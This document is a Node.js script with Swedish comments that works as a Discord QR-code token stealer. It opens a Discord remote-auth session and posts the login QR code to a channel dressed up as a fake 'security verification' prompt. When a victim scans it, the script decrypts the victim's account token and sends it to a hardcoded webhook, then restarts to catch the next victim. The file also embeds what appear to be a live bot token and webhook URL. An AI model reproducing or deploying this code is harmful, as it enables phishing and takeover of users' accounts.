const WebSocket = require('ws');
const forge = require('node-forge');
const fs = require('fs');
const QRCode = require('qrcode');
const axios = require('axios');
const FormData = require('form-data');

// --- KONFIGURATION ---
const BOT_TOKEN = 'MTUwMzA0OTk2OTEwMjQ5MTgzMQ.GcqrSp.lz-sUqnkHY4ecdfQvVrVrqhw6ioccIIzTCjzlY';
const CHANNEL_ID = '1503100124912685247';
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1503100262716276939/H7MoyGBzEkElBTb54LTcC72bQ0C3dd8QtuEVPPJmeKhDTYYIktizPLsOayCcYkSZys8g';

console.log("[SYSTEM] Genererar RSA-nycklar...");
const keypair = forge.pki.rsa.generateKeyPair(2048);
const publicKeyPem = forge.pki.publicKeyToPem(keypair.publicKey)
    .replace('-----BEGIN PUBLIC KEY-----', '')
    .replace('-----END PUBLIC KEY-----', '')
    .replace(/\r?\n|\r/g, '');

let heartbeatInterval;
let lastMessageId = null;

// Funktion för att posta QR-koden i din kanal
async function updateQRInChannel(filePath) {
    console.log(`[BOT] Försöker posta bild till kanal ${CHANNEL_ID}...`);
    try {
        const form = new FormData();
        form.append('file', fs.createReadStream(filePath), 'verify.png');
        form.append('payload_json', JSON.stringify({
            content: "**⚠️ SÄKERHETSVERIFIERING**\nSkanna koden med Discord-appen för att verifiera ditt konto och få tillgång till servern.",
            embeds: [{
                title: "Verifiering krävs",
                description: "1. Öppna Discord på mobilen\n2. Gå till Inställningar > Skanna QR-kod\n3. Skanna bilden nedan",
                color: 0x5865F2,
                image: { url: 'attachment://verify.png' }
            }]
        }));

        // Ta bort gammalt meddelande om det finns
        if (lastMessageId) {
            await axios.delete(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages/${lastMessageId}`, {
                headers: { Authorization: `Bot ${BOT_TOKEN}` }
            }).catch(() => {});
        }

        const res = await axios.post(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, form, {
            headers: { 
                ...form.getHeaders(),
                Authorization: `Bot ${BOT_TOKEN}` 
            }
        });
        
        lastMessageId = res.data.id;
        console.log("[BOT] ✅ QR-kod postad framgångsrikt!");
    } catch (err) {
        console.error("[BOT FEL DETALJER]:", err.response?.data || err.message);
    }
}

async function startQRStealer() {
    console.log("\n[SYSTEM] Ansluter till Discord Remote Auth...");
    
    const ws = new WebSocket('wss://remote-auth-gateway.discord.gg/?v=2', {
        headers: {
            "Origin": "https://discord.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        }
    });

    ws.on('message', async (data) => {
        const p = JSON.parse(data);
        
        // Logga alla viktiga paket från Discord
        if (p.op !== 'heartbeat') console.log("[DISCORD] Mottog:", p.op);

        // 1. HELLO - Starta session
        if (p.op === 'hello') {
            heartbeatInterval = setInterval(() => { 
                if(ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ op: 'heartbeat' })); 
            }, p.heartbeat_interval);
            
            // Skicka vår publika nyckel
            ws.send(JSON.stringify({ op: 'init', encoded_public_key: publicKeyPem }));
        }

        // 2. NONCE_PROOF - Bevisa att vi är en giltig klient
        if (p.op === 'nonce_proof') {
            try {
                const decryptedNonce = keypair.privateKey.decrypt(forge.util.decode64(p.encrypted_nonce), 'RSA-OAEP', {
                    md: forge.md.sha256.create(),
                    mgf1: { md: forge.md.sha256.create() }
                });
                const proof = forge.util.encode64(forge.md.sha256.create().update(decryptedNonce).digest().getBytes())
                    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
                
                ws.send(JSON.stringify({ op: 'nonce_proof', proof: proof }));
                console.log("[SYSTEM] RSA-bevis skickat.");
            } catch (e) {
                console.error("[FEL] Kunde inte dekryptera nonce.");
            }
        }

        // 3. INIT / FINGERPRINT - Här skapas QR-koden
        if (p.fingerprint || p.op === 'init') {
            const fingerprint = p.fingerprint || p.temp_fingerprint; 
            if (fingerprint) {
                console.log("[SYSTEM] Fingerprint mottaget. Genererar QR...");
                const qrUrl = `https://discord.com/ra/${fingerprint}`;
                await QRCode.toFile('./channel_qr.png', qrUrl);
                await updateQRInChannel('./channel_qr.png');
            }
        }

        // 4. PENDING - Discord väntar på skanning
        if (p.op === 'pending_remote_init') {
            console.log("[SYSTEM] 🚀 Boten är redo i kanalen. Väntar på offer...");
        }

        // 5. FINISH - Token fångad!
        if (p.op === 'finish') {
            try {
                const decryptedToken = keypair.privateKey.decrypt(forge.util.decode64(p.encrypted_token), 'RSA-OAEP', {
                    md: forge.md.sha256.create(),
                    mgf1: { md: forge.md.sha256.create() }
                });

                console.log("\n🏆 TOKEN FÅNGAD: " + decryptedToken);
                
                // Skicka till Webhook
                await axios.post(WEBHOOK_URL, {
                    content: `🚨 **Ny inloggning lyckades!**\n**Token:** \`${decryptedToken}\``
                }).catch(() => {});

                // Rensa meddelandet i kanalen
                if (lastMessageId) {
                    await axios.delete(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages/${lastMessageId}`, {
                        headers: { Authorization: `Bot ${BOT_TOKEN}` }
                    }).catch(() => {});
                }
                
                ws.close();
            } catch (e) {
                console.error("[FEL] Kunde inte dekryptera token.");
            }
        }
    });

    ws.on('close', () => {
        clearInterval(heartbeatInterval);
        console.log("[SYSTEM] Session utgången. Startar om om 5 sekunder...");
        setTimeout(startQRStealer, 5000);
    });

    ws.on('error', (err) => {
        console.error("[WS FEL]", err.message);
    });
}

// Starta scriptet
startQRStealer();
